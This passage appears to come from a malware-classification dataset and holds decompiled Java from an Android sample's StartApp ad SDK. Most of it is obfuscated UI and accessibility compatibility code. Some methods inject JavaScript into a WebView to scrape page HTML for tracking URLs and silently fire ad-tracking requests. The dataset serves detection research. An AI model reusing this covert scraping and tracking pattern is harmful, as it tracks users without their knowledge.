((InputMethodManager)b.this.a().getSystemService(""input_method"")).hideSoftInputFromWindow(b.this.b.getWindowToken(),0);     }   } ); } } static int e(b bVar){ int i2=bVar.f; bVar.f=i2 + 1; return i2; } public void e(){ k kVar=this.e; if (g.a(a(),""trackingUrl"",(String)null) == null) {   try {     this.b.loadUrl(""javascript:window.HTMLOUT.processHTML(document.getElementById('SearchResults').innerHTML);"");   }  catch (  Throwable th) {     i.a(""Slider"",6,""Error reading SearchResults div "",th);   } } new com.startapp.android.publish.slider.a(this.a).execute(kVar.a().get(0).getTrackingUrl()); } public Activity a(){ return this.a; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider\WebViewJSInterface.code","public class WebViewJSInterface {   private Context mContext;   private String trackingUrl;   public WebViewJSInterface(  Context context){     this.mContext=context;   }   private void megreTackingUrls(  String str){     ArrayList arrayList=new ArrayList();     if (str != null) {       String[] split=str.split("","");       if (split.length == 1) {         this.trackingUrl=split[0];         return;       }       String str2=split[0].split(""tracking/adImpression"")[0] + ""tracking/adImpression"";       for (      String str3 : split) {         arrayList.add(""d="" + str3.split(""tracking/adImpression[?]d="")[1]);       }       this.trackingUrl=""http://www.startappexchange.com/tracking/adImpression?"" + TextUtils.join(""&"",arrayList);     }   }   private String substringBetween(  String str,  String str2,  String str3){     int indexOf;     int indexOf2;     if (str == null || str2 == null || str3 == null || (indexOf=str.indexOf(str2)) == -1 || (indexOf2=str.indexOf(str3,str2.length() + indexOf)) == -1) {       return null;     }     return str.substring(str2.length() + indexOf,indexOf2);   }   public String getTrackingUrl(){     return this.trackingUrl;   }   @JavascriptInterface public void processHTML(  String str){     megreTackingUrls(substringBetween(str,""@tracking@"",""@tracking@""));     if (this.trackingUrl != null) {       g.b(this.mContext,""trackingUrl"",this.trackingUrl);     }   }   @JavascriptInterface public void processServerEvent(  String str){     if (!g.a(this.mContext,""slideEvent"",(Boolean)false).booleanValue() || g.a(this.mContext,""trackingEvent"",(Boolean)false).booleanValue()) {       return;     }     megreTackingUrls(substringBetween(str,""@tracking@"",""@tracking@""));     if (this.trackingUrl != null) {       g.b(this.mContext,""trackingUrl"",this.trackingUrl);       new a(this.mContext).execute("""");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\a.code","public class a {   static final InterfaceC0058a b;   Object a; interface InterfaceC0058a {     Object a(    Context context,    Interpolator interpolator);     void a(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5);     boolean a(    Object obj);     int b(    Object obj);     int c(    Object obj);     boolean d(    Object obj);     void e(    Object obj);     int f(    Object obj);     int g(    Object obj);   } static class b implements InterfaceC0058a {     b(){     }     @Override public Object a(    Context context,    Interpolator interpolator){       return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);     }     @Override public void a(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5){       ((Scroller)obj).startScroll(i,i2,i3,i4,i5);     }     @Override public boolean a(    Object obj){       return ((Scroller)obj).isFinished();     }     @Override public int b(    Object obj){       return ((Scroller)obj).getCurrX();     }     @Override public int c(    Object obj){       return ((Scroller)obj).getCurrY();     }     @Override public boolean d(    Object obj){       return ((Scroller)obj).computeScrollOffset();     }     @Override public void e(    Object obj){       ((Scroller)obj).abortAnimation();     }     @Override public int f(    Object obj){       return ((Scroller)obj).getFinalX();     }     @Override public int g(    Object obj){       return ((Scroller)obj).getFinalY();     }   } static class c implements InterfaceC0058a {     c(){     }     @Override public Object a(    Context context,    Interpolator interpolator){       return com.startapp.android.publish.slider.sliding.b.a(context,interpolator);     }     @Override public void a(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5){       com.startapp.android.publish.slider.sliding.b.a(obj,i,i2,i3,i4,i5);     }     @Override public boolean a(    Object obj){       return com.startapp.android.publish.slider.sliding.b.a(obj);     }     @Override public int b(    Object obj){       return com.startapp.android.publish.slider.sliding.b.b(obj);     }     @Override public int c(    Object obj){       return com.startapp.android.publish.slider.sliding.b.c(obj);     }     @Override public boolean d(    Object obj){       return com.startapp.android.publish.slider.sliding.b.d(obj);     }     @Override public void e(    Object obj){       com.startapp.android.publish.slider.sliding.b.e(obj);     }     @Override public int f(    Object obj){       return com.startapp.android.publish.slider.sliding.b.f(obj);     }     @Override public int g(    Object obj){       return com.startapp.android.publish.slider.sliding.b.g(obj);     }   } static class d extends c {     d(){     }   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 14) {       b=new d();     }  else     if (i >= 9) {       b=new c();     }  else {       b=new b();     }   }   a(  Context context,  Interpolator interpolator){     this.a=b.a(context,interpolator);   }   public static a a(  Context context,  Interpolator interpolator){     return new a(context,interpolator);   }   public void a(  int i,  int i2,  int i3,  int i4,  int i5){     b.a(this.a,i,i2,i3,i4,i5);   }   public boolean a(){     return b.a(this.a);   }   public int b(){     return b.b(this.a);   }   public int c(){     return b.c(this.a);   }   public int d(){     return b.f(this.a);   }   public int e(){     return b.g(this.a);   }   public boolean f(){     return b.d(this.a);   }   public void g(){     b.e(this.a);   } } public static abstract class a {   public int a(  View view){     return 0;   }   public int a(  View view,  int i,  int i2){     return 0;   }   public void a(  int i){   }   public void a(  int i,  int i2){   }   public void a(  View view,  float f,  float f2){   }   public void a(  View view,  int i,  int i2,  int i3,  int i4){   }   public abstract boolean a(  View view,  int i);   public int b(  View view){     return 0;   }   public int b(  View view,  int i,  int i2){     return 0;   }   public void b(  int i,  int i2){   }   public void b(  View view,  int i){   }   public boolean b(  int i){     return false;   }   public int c(  int i){     return i;   } } class a extends com.startapp.android.publish.slider.sliding.b.a {   private final Rect c=new Rect();   a(){   }   private void a(  com.startapp.android.publish.slider.sliding.a.a aVar,  com.startapp.android.publish.slider.sliding.a.a aVar2){     Rect rect=this.c;     aVar2.a(rect);     aVar.b(rect);     aVar2.c(rect);     aVar.d(rect);     aVar.c(aVar2.g());     aVar.a(aVar2.o());     aVar.b(aVar2.p());     aVar.c(aVar2.r());     aVar.h(aVar2.l());     aVar.f(aVar2.j());     aVar.a(aVar2.e());     aVar.b(aVar2.f());     aVar.d(aVar2.h());     aVar.e(aVar2.i());     aVar.g(aVar2.k());     aVar.a(aVar2.b());   }   @Override public void a(  View view,  com.startapp.android.publish.slider.sliding.a.a aVar){     com.startapp.android.publish.slider.sliding.a.a a=com.startapp.android.publish.slider.sliding.a.a.a(aVar);     super.a(view,a);     aVar.a(view);     Object c=l.c(view);     if (c instanceof View) {       aVar.c((View)c);     }     a(aVar,a);     a.s();     int childCount=DrawerLayout.this.getChildCount();     for (int i=0; i < childCount; i++) {       View childAt=DrawerLayout.this.getChildAt(i);       if (!a(childAt)) {         aVar.b(childAt);       }     }   }   public boolean a(  View view){     View a=DrawerLayout.this.a();     return (a == null || a == view) ? false : true;   }   @Override public boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     if (a(view)) {       return false;     }     return super.a(viewGroup,view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\b.code","static class b implements InterfaceC0058a {   b(){   }   @Override public Object a(  Context context,  Interpolator interpolator){     return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);   }   @Override public void a(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5){     ((Scroller)obj).startScroll(i,i2,i3,i4,i5);   }   @Override public boolean a(  Object obj){     return ((Scroller)obj).isFinished();   }   @Override public int b(  Object obj){     return ((Scroller)obj).getCurrX();   }   @Override public int c(  Object obj){     return ((Scroller)obj).getCurrY();   }   @Override public boolean d(  Object obj){     return ((Scroller)obj).computeScrollOffset();   }   @Override public void e(  Object obj){     ((Scroller)obj).abortAnimation();   }   @Override public int f(  Object obj){     return ((Scroller)obj).getFinalX();   }   @Override public int g(  Object obj){     return ((Scroller)obj).getFinalY();   } } class b {   public static Object a(  Context context,  Interpolator interpolator){     return interpolator != null ? new OverScroller(context,interpolator) : new OverScroller(context);   }   public static void a(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5){     ((OverScroller)obj).startScroll(i,i2,i3,i4,i5);   }   public static boolean a(  Object obj){     return ((OverScroller)obj).isFinished();   }   public static int b(  Object obj){     return ((OverScroller)obj).getCurrX();   }   public static int c(  Object obj){     return ((OverScroller)obj).getCurrY();   }   public static boolean d(  Object obj){     return ((OverScroller)obj).computeScrollOffset();   }   public static void e(  Object obj){     ((OverScroller)obj).abortAnimation();   }   public static int f(  Object obj){     return ((OverScroller)obj).getFinalX();   }   public static int g(  Object obj){     return ((OverScroller)obj).getFinalY();   } } public interface b {   void a(  int i);   void a(  View view);   void a(  View view,  float f);   void b(  View view); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\c.code","static class c implements InterfaceC0058a {   c(){   }   @Override public Object a(  Context context,  Interpolator interpolator){     return com.startapp.android.publish.slider.sliding.b.a(context,interpolator);   }   @Override public void a(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5){     com.startapp.android.publish.slider.sliding.b.a(obj,i,i2,i3,i4,i5);   }   @Override public boolean a(  Object obj){     return com.startapp.android.publish.slider.sliding.b.a(obj);   }   @Override public int b(  Object obj){     return com.startapp.android.publish.slider.sliding.b.b(obj);   }   @Override public int c(  Object obj){     return com.startapp.android.publish.slider.sliding.b.c(obj);   }   @Override public boolean d(  Object obj){     return com.startapp.android.publish.slider.sliding.b.d(obj);   }   @Override public void e(  Object obj){     com.startapp.android.publish.slider.sliding.b.e(obj);   }   @Override public int f(  Object obj){     return com.startapp.android.publish.slider.sliding.b.f(obj);   }   @Override public int g(  Object obj){     return com.startapp.android.publish.slider.sliding.b.g(obj);   } } !org.eclipse.jdt.core.dom.TypeDeclaration@56df5967public static class c extends ViewGroup.MarginLayoutParams {   public int a;   float b;   boolean c;   boolean d;   public c(  int i,  int i2){     super(i,i2);     this.a=0;   }   public c(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.a=0;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(attributeSet,DrawerLayout.a);     this.a=obtainStyledAttributes.getInt(0,0);     obtainStyledAttributes.recycle();   }   public c(  ViewGroup.LayoutParams layoutParams){     super(layoutParams);     this.a=0;   }   public c(  ViewGroup.MarginLayoutParams marginLayoutParams){     super(marginLayoutParams);     this.a=0;   }   public c(  c cVar){     super((ViewGroup.MarginLayoutParams)cVar);     this.a=0;     this.a=cVar.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\d.code","static class d extends c {   d(){   } } public class d extends c.a {   private final int b;   private com.startapp.android.publish.slider.sliding.c c;   private final Runnable d=new Runnable(){     @Override public void run(){       d.this.c();     }   } ;   public d(  int i){     this.b=i;   }   private void b(){     View a=DrawerLayout.this.a(this.b == 3 ? 5 : 3);     if (a != null) {       DrawerLayout.this.i(a);     }   }   public void c(){     View view;     int i;     int b=this.c.b();     boolean z=this.b == 3;     if (z) {       View a=DrawerLayout.this.a(3);       int i2=(a != null ? -a.getWidth() : 0) + b;       view=a;       i=i2;     }  else {       View a2=DrawerLayout.this.a(5);       int width=DrawerLayout.this.getWidth() - b;       view=a2;       i=width;     }     if (view != null) {       if (((!z || view.getLeft() >= i) && (z || view.getLeft() <= i)) || DrawerLayout.this.a(view) != 0) {         return;       }       c cVar=(c)view.getLayoutParams();       this.c.a(view,i,view.getTop());       cVar.c=true;       DrawerLayout.this.invalidate();       b();       DrawerLayout.this.c();     }   }   @Override public int a(  View view){     return view.getWidth();   }   @Override public int a(  View view,  int i,  int i2){     if (DrawerLayout.this.a(view,3)) {       return Math.max(-view.getWidth(),Math.min(i,0));     }     int width=DrawerLayout.this.getWidth();     return Math.max(width - view.getWidth(),Math.min(i,width));   }   public void a(){     DrawerLayout.this.removeCallbacks(this.d);   }   @Override public void a(  int i){     DrawerLayout.this.a(this.b,i,this.c.c());   }   @Override public void a(  int i,  int i2){     DrawerLayout.this.postDelayed(this.d,160L);   }   @Override public void a(  View view,  float f,  float f2){     int width;     float d=DrawerLayout.this.d(view);     int width2=view.getWidth();     if (DrawerLayout.this.a(view,3)) {       width=(f > 0.0f || (f == 0.0f && d > 0.5f)) ? 0 : -width2;     }  else {       width=DrawerLayout.this.getWidth();       if (f < 0.0f || (f == 0.0f && d < 0.5f)) {         width-=width2;       }     }     this.c.a(width,view.getTop());     DrawerLayout.this.invalidate();   }   @Override public void a(  View view,  int i,  int i2,  int i3,  int i4){     int width=view.getWidth();     float width2=DrawerLayout.this.a(view,3) ? (width + i) / width : (DrawerLayout.this.getWidth() - i) / width;     DrawerLayout.this.b(view,width2);     view.setVisibility(width2 == 0.0f ? 4 : 0);     DrawerLayout.this.invalidate();   }   public void a(  com.startapp.android.publish.slider.sliding.c cVar){     this.c=cVar;   }   @Override public boolean a(  View view,  int i){     return DrawerLayout.this.g(view) && DrawerLayout.this.a(view,this.b) && DrawerLayout.this.a(view) == 0;   }   @Override public int b(  View view,  int i,  int i2){     return view.getTop();   }   @Override public void b(  int i,  int i2){     View a=(i & 1) == 1 ? DrawerLayout.this.a(3) : DrawerLayout.this.a(5);     if (a == null || DrawerLayout.this.a(a) != 0) {       return;     }     this.c.a(a,i2);   }   @Override public void b(  View view,  int i){     ((c)view.getLayoutParams()).c=false;     b();   }   @Override public boolean b(  int i){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\DrawerLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a12b5cb"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\InterfaceC0058a.code","interface InterfaceC0058a {   Object a(  Context context,  Interpolator interpolator);   void a(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5);   boolean a(  Object obj);   int b(  Object obj);   int c(  Object obj);   boolean d(  Object obj);   void e(  Object obj);   int f(  Object obj);   int g(  Object obj); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel parcel){       return new SavedState(parcel);     }     @Override public SavedState[] newArray(    int i){       return new SavedState[i];     }   } ;   int a;   int b;   int c;   public SavedState(  Parcel parcel){     super(parcel);     this.a=0;     this.b=0;     this.c=0;     this.a=parcel.readInt();   }   public SavedState(  Parcelable parcelable){     super(parcelable);     this.a=0;     this.b=0;     this.c=0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     parcel.writeInt(this.a);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@24e301interface a {   Object a(  d dVar); } interface a {   Object a(  int i);   List<Object> a(  String str,  int i);   boolean a(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\b.code","public interface b {   Object a(  Object obj);   void a(  Object obj,  int i);   void a(  Object obj,  Rect rect);   void a(  Object obj,  View view);   void a(  Object obj,  CharSequence charSequence);   void a(  Object obj,  boolean z);   int b(  Object obj);   void b(  Object obj,  Rect rect);   void b(  Object obj,  View view);   void b(  Object obj,  CharSequence charSequence);   void b(  Object obj,  boolean z);   CharSequence c(  Object obj);   void c(  Object obj,  Rect rect);   void c(  Object obj,  View view);   void c(  Object obj,  CharSequence charSequence);   void c(  Object obj,  boolean z);   CharSequence d(  Object obj);   void d(  Object obj,  Rect rect);   void d(  Object obj,  boolean z);   CharSequence e(  Object obj);   void e(  Object obj,  boolean z);   CharSequence f(  Object obj);   void f(  Object obj,  boolean z);   void g(  Object obj,  boolean z);   boolean g(  Object obj);   void h(  Object obj,  boolean z);   boolean h(  Object obj);   boolean i(  Object obj);   boolean j(  Object obj);   boolean k(  Object obj);   boolean l(  Object obj);   boolean m(  Object obj);   boolean n(  Object obj);   boolean o(  Object obj);   boolean p(  Object obj);   void q(  Object obj);   boolean r(  Object obj);   boolean s(  Object obj); } class b {   public static Object a(  Object obj){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)obj);   }   public static void a(  Object obj,  int i){     ((AccessibilityNodeInfo)obj).addAction(i);   }   public static void a(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).getBoundsInParent(rect);   }   public static void a(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).addChild(view);   }   public static void a(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setClassName(charSequence);   }   public static void a(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setClickable(z);   }   public static int b(  Object obj){     return ((AccessibilityNodeInfo)obj).getActions();   }   public static void b(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).getBoundsInScreen(rect);   }   public static void b(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).setParent(view);   }   public static void b(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setContentDescription(charSequence);   }   public static void b(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setEnabled(z);   }   public static CharSequence c(  Object obj){     return ((AccessibilityNodeInfo)obj).getClassName();   }   public static void c(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).setBoundsInParent(rect);   }   public static void c(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).setSource(view);   }   public static void c(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setPackageName(charSequence);   }   public static void c(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setFocusable(z);   }   public static CharSequence d(  Object obj){     return ((AccessibilityNodeInfo)obj).getContentDescription();   }   public static void d(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).setBoundsInScreen(rect);   }   public static void d(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setFocused(z);   }   public static CharSequence e(  Object obj){     return ((AccessibilityNodeInfo)obj).getPackageName();   }   public static void e(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setLongClickable(z);   }   public static CharSequence f(  Object obj){     return ((AccessibilityNodeInfo)obj).getText();   }   public static void f(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setSelected(z);   }   public static boolean g(  Object obj){     return ((AccessibilityNodeInfo)obj).isCheckable();   }   public static boolean h(  Object obj){     return ((AccessibilityNodeInfo)obj).isChecked();   }   public static boolean i(  Object obj){     return ((AccessibilityNodeInfo)obj).isClickable();   }   public static boolean j(  Object obj){     return ((AccessibilityNodeInfo)obj).isEnabled();   }   public static boolean k(  Object obj){     return ((AccessibilityNodeInfo)obj).isFocusable();   }   public static boolean l(  Object obj){     return ((AccessibilityNodeInfo)obj).isFocused();   }   public static boolean m(  Object obj){     return ((AccessibilityNodeInfo)obj).isLongClickable();   }   public static boolean n(  Object obj){     return ((AccessibilityNodeInfo)obj).isPassword();   }   public static boolean o(  Object obj){     return ((AccessibilityNodeInfo)obj).isScrollable();   }   public static boolean p(  Object obj){     return ((AccessibilityNodeInfo)obj).isSelected();   }   public static void q(  Object obj){     ((AccessibilityNodeInfo)obj).recycle();   } } static class b extends c {   b(){   }   @Override public Object a(  final d dVar){     return e.a(new e.a(){       @Override public Object a(      int i){         com.startapp.android.publish.slider.sliding.a.a a=dVar.a(i);         if (a == null) {           return null;         }         return a.a();       }       @Override public List<Object> a(      String str,      int i){         List<com.startapp.android.publish.slider.sliding.a.a> a=dVar.a(str,i);         ArrayList arrayList=new ArrayList();         int size=a.size();         for (int i2=0; i2 < size; i2++) {           arrayList.add(a.get(i2).a());         }         return arrayList;       }       @Override public boolean a(      int i,      int i2,      Bundle bundle){         return dVar.a(i,i2,bundle);       }     } );   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\c.code","static class c extends C0059a {   c(){   }   @Override public void g(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.c.a(obj,z);   }   @Override public void h(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.c.b(obj,z);   }   @Override public boolean r(  Object obj){     return com.startapp.android.publish.slider.sliding.a.c.a(obj);   }   @Override public boolean s(  Object obj){     return com.startapp.android.publish.slider.sliding.a.c.b(obj);   } } class c {   public static void a(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setVisibleToUser(z);   }   public static boolean a(  Object obj){     return ((AccessibilityNodeInfo)obj).isVisibleToUser();   }   public static void b(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setAccessibilityFocused(z);   }   public static boolean b(  Object obj){     return ((AccessibilityNodeInfo)obj).isAccessibilityFocused();   } } static class c implements a {   c(){   }   @Override public Object a(  d dVar){     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\C0059a.code","static class C0059a extends e {   C0059a(){   }   @Override public Object a(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.a(obj);   }   @Override public void a(  Object obj,  int i){     com.startapp.android.publish.slider.sliding.a.b.a(obj,i);   }   @Override public void a(  Object obj,  Rect rect){     com.startapp.android.publish.slider.sliding.a.b.a(obj,rect);   }   @Override public void a(  Object obj,  View view){     com.startapp.android.publish.slider.sliding.a.b.a(obj,view);   }   @Override public void a(  Object obj,  CharSequence charSequence){     com.startapp.android.publish.slider.sliding.a.b.a(obj,charSequence);   }   @Override public void a(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.a(obj,z);   }   @Override public int b(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.b(obj);   }   @Override public void b(  Object obj,  Rect rect){     com.startapp.android.publish.slider.sliding.a.b.b(obj,rect);   }   @Override public void b(  Object obj,  View view){     com.startapp.android.publish.slider.sliding.a.b.b(obj,view);   }   @Override public void b(  Object obj,  CharSequence charSequence){     com.startapp.android.publish.slider.sliding.a.b.b(obj,charSequence);   }   @Override public void b(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.b(obj,z);   }   @Override public CharSequence c(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.c(obj);   }   @Override public void c(  Object obj,  Rect rect){     com.startapp.android.publish.slider.sliding.a.b.c(obj,rect);   }   @Override public void c(  Object obj,  View view){     com.startapp.android.publish.slider.sliding.a.b.c(obj,view);   }   @Override public void c(  Object obj,  CharSequence charSequence){     com.startapp.android.publish.slider.sliding.a.b.c(obj,charSequence);   }   @Override public void c(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.c(obj,z);   }   @Override public CharSequence d(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.d(obj);   }   @Override public void d(  Object obj,  Rect rect){     com.startapp.android.publish.slider.sliding.a.b.d(obj,rect);   }   @Override public void d(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.d(obj,z);   }   @Override public CharSequence e(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.e(obj);   }   @Override public void e(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.e(obj,z);   }   @Override public CharSequence f(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.f(obj);   }   @Override public void f(  Object obj,  boolean z){     com.startapp.android.publish.slider.sliding.a.b.f(obj,z);   }   @Override public boolean g(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.g(obj);   }   @Override public boolean h(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.h(obj);   }   @Override public boolean i(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.i(obj);   }   @Override public boolean j(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.j(obj);   }   @Override public boolean k(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.k(obj);   }   @Override public boolean l(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.l(obj);   }   @Override public boolean m(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.m(obj);   }   @Override public boolean n(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.n(obj);   }   @Override public boolean o(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.o(obj);   }   @Override public boolean p(  Object obj){     return com.startapp.android.publish.slider.sliding.a.b.p(obj);   }   @Override public void q(  Object obj){     com.startapp.android.publish.slider.sliding.a.b.q(obj);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\d.code","static class d extends c {   d(){   } } public class d {   private static final a a;   private final Object b; interface a {     Object a(    d dVar);   } static class b extends c {     b(){     }     @Override public Object a(    final d dVar){       return e.a(new e.a(){         @Override public Object a(        int i){           com.startapp.android.publish.slider.sliding.a.a a=dVar.a(i);           if (a == null) {             return null;           }           return a.a();         }         @Override public List<Object> a(        String str,        int i){           List<com.startapp.android.publish.slider.sliding.a.a> a=dVar.a(str,i);           ArrayList arrayList=new ArrayList();           int size=a.size();           for (int i2=0; i2 < size; i2++) {             arrayList.add(a.get(i2).a());           }           return arrayList;         }         @Override public boolean a(        int i,        int i2,        Bundle bundle){           return dVar.a(i,i2,bundle);         }       } );     }   } static class c implements a {     c(){     }     @Override public Object a(    d dVar){       return null;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       a=new b();     }  else {       a=new c();     }   }   public d(){     this.b=a.a(this);   }   public d(  Object obj){     this.b=obj;   }   public com.startapp.android.publish.slider.sliding.a.a a(  int i){     return null;   }   public Object a(){     return this.b;   }   public List<com.startapp.android.publish.slider.sliding.a.a> a(  String str,  int i){     return null;   }   public boolean a(  int i,  int i2,  Bundle bundle){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.a\e.code","static class e implements b {   e(){   }   @Override public Object a(  Object obj){     return null;   }   @Override public void a(  Object obj,  int i){   }   @Override public void a(  Object obj,  Rect rect){   }   @Override public void a(  Object obj,  View view){   }   @Override public void a(  Object obj,  CharSequence charSequence){   }   @Override public void a(  Object obj,  boolean z){   }   @Override public int b(  Object obj){     return 0;   }   @Override public void b(  Object obj,  Rect rect){   }   @Override public void b(  Object obj,  View view){   }   @Override public void b(  Object obj,  CharSequence charSequence){   }   @Override public void b(  Object obj,  boolean z){   }   @Override public CharSequence c(  Object obj){     return null;   }   @Override public void c(  Object obj,  Rect rect){   }   @Override public void c(  Object obj,  View view){   }   @Override public void c(  Object obj,  CharSequence charSequence){   }   @Override public void c(  Object obj,  boolean z){   }   @Override public CharSequence d(  Object obj){     return null;   }   @Override public void d(  Object obj,  Rect rect){   }   @Override public void d(  Object obj,  boolean z){   }   @Override public CharSequence e(  Object obj){     return null;   }   @Override public void e(  Object obj,  boolean z){   }   @Override public CharSequence f(  Object obj){     return null;   }   @Override public void f(  Object obj,  boolean z){   }   @Override public void g(  Object obj,  boolean z){   }   @Override public boolean g(  Object obj){     return false;   }   @Override public void h(  Object obj,  boolean z){   }   @Override public boolean h(  Object obj){     return false;   }   @Override public boolean i(  Object obj){     return false;   }   @Override public boolean j(  Object obj){     return false;   }   @Override public boolean k(  Object obj){     return false;   }   @Override public boolean l(  Object obj){     return false;   }   @Override public boolean m(  Object obj){     return false;   }   @Override public boolean n(  Object obj){     return false;   }   @Override public boolean o(  Object obj){     return false;   }   @Override public boolean p(  Object obj){     return false;   }   @Override public void q(  Object obj){   }   @Override public boolean r(  Object obj){     return false;   }   @Override public boolean s(  Object obj){     return false;   } } class e { interface a {     Object a(    int i);     List<Object> a(    String str,    int i);     boolean a(    int i,    int i2,    Bundle bundle);   }   public static Object a(  final a aVar){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int i){         return (AccessibilityNodeInfo)a.this.a(i);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String str,      int i){         return a.this.a(str,i);       }       @Override public boolean performAction(      int i,      int i2,      Bundle bundle){         return a.this.a(i,i2,bundle);       }     } ;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider.sliding.b\a.code","public class a {   private static final b a;   private static final Object c;   final Object b=a.a(this); static class C0060a extends d {     C0060a(){     }     @Override public Object a(){       return com.startapp.android.publish.slider.sliding.b.b.a();     }     @Override public Object a(    final a aVar){       return com.startapp.android.publish.slider.sliding.b.b.a(new b.a(){         @Override public void a(        View view,        int i){           aVar.a(view,i);         }         @Override public void a(        View view,        Object obj){           aVar.a(view,new com.startapp.android.publish.slider.sliding.a.a(obj));         }         @Override public boolean a(        View view,        AccessibilityEvent accessibilityEvent){           return aVar.b(view,accessibilityEvent);         }         @Override public boolean a(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return aVar.a(viewGroup,view,accessibilityEvent);         }         @Override public void b(        View view,        AccessibilityEvent accessibilityEvent){           aVar.d(view,accessibilityEvent);         }         @Override public void c(        